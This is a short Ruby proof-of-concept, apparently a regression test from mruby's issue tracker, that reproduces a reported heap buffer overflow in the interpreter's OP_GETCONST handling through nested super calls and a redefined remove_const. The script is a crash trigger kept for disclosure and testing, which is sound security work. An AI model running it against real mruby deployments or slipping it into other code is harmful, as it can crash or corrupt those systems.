# Heap buffer overflow in OP_GETCONST
# Issue: https://github.com/mruby/mruby/issues/3611
# Reported via hackerone

class CVAR1
def send(*)
super
begin
mvar1
mvar1
rescue => c
ensure
end
end
end

def mvar1(*)
end

mvarsend1 = def remove_const
super(*b)
end

CVAR1.new.send(mvarsend1)